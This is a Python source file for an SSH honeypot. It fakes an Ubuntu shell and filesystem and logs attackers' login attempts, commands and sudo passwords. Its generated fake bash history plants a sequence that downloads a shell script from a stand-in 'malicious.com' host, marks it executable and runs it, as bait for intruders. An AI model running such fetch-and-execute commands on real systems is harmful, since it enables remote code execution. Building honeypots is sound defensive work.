"""SSH honeypot service handler and filesystem simulation"""
import logging
import paramiko
import threading
import copy
from datetime import datetime, timedelta
import random
from ..utils.logging import log_attack

class FakeFileSystem:
    def __init__(self):
        self.base_filesystem = {
            "/": {
                "home": {
                    "user": {
                        "Documents": {"important.txt": "[ENCRYPTED CONTENT]"},
                        "Downloads": {"notes.txt": "important"},
                        "Desktop": {"README.txt": self._generate_timestamp()},
                        ".ssh": {
                            "id_rsa": self._generate_timestamp(),
                            "known_hosts": self._generate_timestamp(),
                        },
                        ".bash_history": self._generate_fake_bash_history(),
                    }
                },
                "var": {
                    "log": {
                        "auth.log": self._generate_timestamp(),
                        "syslog": self._generate_timestamp(),
                    }
                },
                "etc": {
                    "passwd": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash",
                    "shadow": "root:!:18642:0:99999:7:::",
                },
                "tmp": {},
                "proc": {
                    "cpuinfo": self._generate_fake_cpuinfo()
                }
            }
        }
        self.sessions = {}

    def _generate_timestamp(self):
        """Generate fake timestamps for ls -la output"""
        timestamp = datetime.now() - timedelta(days=random.randint(0, 30))
        return f"-rw-r--r-- 1 user user 4096 {timestamp.strftime('%b %d %H:%M')}"

    def _generate_fake_bash_history(self):
        """Create a fake .bash_history"""
        return "\n".join([
            "ls -la",
            "cd /etc",
            "cat passwd",
            "cat shadow",
            "cd ~",
            "ls -la",
            "wget http://malicious.com/shell.sh",
            "chmod +x shell.sh",
            "./shell.sh",
            "exit"
        ])

    def _generate_fake_cpuinfo(self):
        """Generate fake CPU info"""
        return """processor   : 0
vendor_id   : GenuineIntel
cpu family  : 6
model       : 158
model name  : Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz
stepping    : 10
cpu MHz     : 2592.000
cache size  : 12288 KB
flags       : fpu vme de pse tsc msr pae mce cx8 sep mtrr pae"""

    def get_current_session(self, session_id):
        """Get or create a new session for the client"""
        if session_id not in self.sessions:
            self.sessions[session_id] = {
                "fs": copy.deepcopy(self.base_filesystem),
                "cwd": "/home/user"
            }
        return self.sessions[session_id]

    def _resolve_path(self, session_fs, path):
        """Resolve path within the fake filesystem"""
        if path == "/":
            return session_fs["/"]
        
        parts = path.strip("/").split("/")
        node = session_fs["/"]

        for part in parts:
            if part in node and isinstance(node[part], dict):
                node = node[part]
            else:
                return None
        return node

    def handle_command(self, session_id, command):
        """Handle shell commands in the fake filesystem"""
        session = self.get_current_session(session_id)
        response = ""

        try:
            if command == "pwd":
                response = session["cwd"]

            elif command.startswith("cd "):
                new_path = command.split(" ", 1)[1]
                if new_path == "..":
                    if session["cwd"] != "/":
                        session["cwd"] = "/".join(session["cwd"].rstrip("/").split("/")[:-1]) or "/"
                elif new_path.startswith("/"):
                    resolved = self._resolve_path(session["fs"], new_path)
                    if resolved is not None and isinstance(resolved, dict):
                        session["cwd"] = new_path.rstrip("/")
                    else:
                        response = f"-bash: cd: {new_path}: No such file or directory"
                else:
                    new_abs_path = session["cwd"].rstrip("/") + "/" + new_path
                    resolved = self._resolve_path(session["fs"], new_abs_path)
                    if resolved is not None and isinstance(resolved, dict):
                        session["cwd"] = new_abs_path.rstrip("/")
                    else:
                        response = f"-bash: cd: {new_path}: No such file or directory"

            elif command == "ls" or command.startswith("ls "):
                node = self._resolve_path(session["fs"], session["cwd"])
                if isinstance(node, dict):
                    response = "  ".join(node.keys())
                else:
                    response = "Not a directory"

            elif command.startswith("cat "):
                filename = command.split(" ", 1)[1]
                node = self._resolve_path(session["fs"], session["cwd"])
                if filename in node:
                    if isinstance(node[filename], str):
                        response = node[filename]
                    else:
                        response = f"-bash: cat: {filename}: Is a directory"
                else:
                    response = f"-bash: cat: {filename}: No such file or directory"

            elif command.startswith("echo "):
                response = command[5:]

            else:
                response = f"-bash: {command.split()[0]}: command not found"

        except Exception as e:
            logging.error(f"[SHELL ERROR] {e}")
            response = "Command execution failed"

        return response

class FakeSSHServer(paramiko.ServerInterface):
    def __init__(self, client_ip):
        self.client_ip = client_ip
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        """Check SSH authentication credentials"""
        log_attack(self.client_ip, "SSH", f"Login Attempt: {username}:{password}", "Brute Force")
        if username == "user" and password == "password123":
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED if kind == "session" else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

def handle_ssh(client, addr):
    """Handle SSH connections and simulate a Linux environment"""
    client_ip = addr[0]
    transport = paramiko.Transport(client)
    transport.add_server_key(paramiko.RSAKey.generate(2048))
    server = FakeSSHServer(client_ip)
    fs = FakeFileSystem()

    try:
        transport.start_server(server=server)
        channel = transport.accept(20)
        if channel is None:
            return

        server.event.wait(10)
        if not server.event.is_set():
            return

        channel.send("Welcome to Ubuntu 20.04 LTS\n")
        channel.send("user@server:~$ ")

        while True:
            command = channel.recv(1024).decode().strip()
            if not command:
                break

            log_attack(client_ip, "SSH", command, "Command Execution")

            if command.startswith("sudo") or command.startswith("su"):
                channel.send("[sudo] password for user: ")
                fake_password = channel.recv(1024).decode().strip()
                log_attack(client_ip, "SSH", f"Privilege Escalation Attempt: {fake_password}", "Privilege Escalation")
                response = "user is not in the sudoers file. This incident will be reported."
            else:
                response = fs.handle_command(client_ip, command)

            channel.send(f"{response}\nuser@server:{fs.get_current_session(client_ip)['cwd']}$ ")

    except Exception as e:
        logging.error(f"[SSH ERROR] {e}")
    finally:
        if transport:
            transport.close()
        client.close()